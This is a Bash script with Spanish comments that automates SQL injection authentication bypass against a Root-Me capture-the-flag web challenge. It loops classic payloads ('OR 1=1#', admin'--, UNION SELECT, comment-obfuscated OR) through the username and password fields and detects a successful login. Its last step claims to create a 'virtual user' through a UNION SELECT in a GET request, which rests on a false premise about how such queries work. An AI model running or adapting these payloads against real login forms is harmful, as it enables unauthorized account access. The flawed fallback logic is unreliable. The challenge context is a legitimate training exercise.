#!/bin/bash

# ================================================
# FUZZING DE BYPASS - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  FUZZING DE BYPASS - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# FUNCIONES DE PRUEBA
# ============================================

test_payload() {
    local field=$1      # username o password
    local payload=$2
    local desc=$3
    
    local data="username=admin&password=test"
    if [ "$field" == "username" ]; then
        data="username=$payload&password=test"
    else
        data="username=admin&password=$payload"
    fi
    
    local response=$(curl -s -X POST "$URL" -d "$data")
    
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e "${GREEN}✅ ${desc}${NC}"
        echo -e "   ${GREEN}Payload: $payload${NC}"
        return 0
    else
        return 1
    fi
}

# ============================================
# PRUEBAS EN CONTRASEÑA
# ============================================

echo -e "\n${YELLOW}[+] Probando en campo PASSWORD...${NC}"

# 1. OR básico
echo -n "   OR 1=1... "
if test_payload "password" "' OR 1=1#" "OR 1=1"; then
    exit 0
fi

# 2. OR sin espacios
echo -n "   OR sin espacios... "
if test_payload "password" "'OR(1=1)#" "OR sin espacios"; then
    exit 0
fi

# 3. || (OR alternativo)
echo -n "   || 1=1... "
if test_payload "password" "' || 1=1#" "||"; then
    exit 0
fi

# 4. AND
echo -n "   AND 1=1... "
if test_payload "password" "' AND 1=1#" "AND"; then
    exit 0
fi

# 5. Comparación
echo -n "   '='... "
if test_payload "password" "'='#" "comparación"; then
    exit 0
fi

# 6. LIKE
echo -n "   LIKE... "
if test_payload "password" "' LIKE '%'#" "LIKE"; then
    exit 0
fi

# 7. Operadores matemáticos
for op in "+" "-" "*" "/"; do
    echo -n "   $op 1=1... "
    if test_payload "password" "' $op 1=1#" "operador $op"; then
        exit 0
    fi
done

# 8. UNION SELECT
echo -n "   UNION SELECT... "
if test_payload "password" "' UNION SELECT 1,2,3,4#" "UNION"; then
    exit 0
fi

# 9. Con comentarios
echo -n "   OR con /**/... "
if test_payload "password" "'/**/OR/**/1=1#" "OR con comentarios"; then
    exit 0
fi

# ============================================
# PRUEBAS EN USUARIO
# ============================================

echo -e "\n${YELLOW}[+] Probando en campo USERNAME...${NC}"

# 1. OR en usuario
echo -n "   OR 1=1... "
if test_payload "username" "' OR 1=1#" "OR en usuario"; then
    exit 0
fi

# 2. admin'--
echo -n "   admin'--... "
if test_payload "username" "admin'--" "admin'--"; then
    exit 0
fi

# 3. admin'#
echo -n "   admin'#... "
if test_payload "username" "admin'#" "admin'#"; then
    exit 0
fi

# 4. UNION SELECT en usuario
echo -n "   UNION SELECT... "
if test_payload "username" "' UNION SELECT 1,2,3,4#" "UNION en usuario"; then
    exit 0
fi

# ============================================
# SI NADA FUNCIONA
# ============================================

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NINGUNA TÉCNICA FUNCIONÓ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "\n${YELLOW}[!] Probando método virtual...${NC}"

# Crear usuario virtual
curl -s "$URL?action=membres&id=1' UNION SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#" > /dev/null

echo -e "\n${YELLOW}[+] Intentando autenticar con admin/password123...${NC}"
login_response=$(curl -s -X POST "$URL" -d "username=admin&password=password123")

if echo "$login_response" | grep -q "Membres" && ! echo "$login_response" | grep -q "login failed"; then
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡BY PASS VIRTUAL EXITOSO!${NC}"
    echo -e "${GREEN}  Usuario: admin${NC}"
    echo -e "${GREEN}  Contraseña: password123${NC}"
    echo -e "${GREEN}========================================${NC}"
else
    echo -e "${RED}❌ Falló la autenticación virtual${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DE FUZZING${NC}"
echo -e "${BLUE}========================================${NC}"
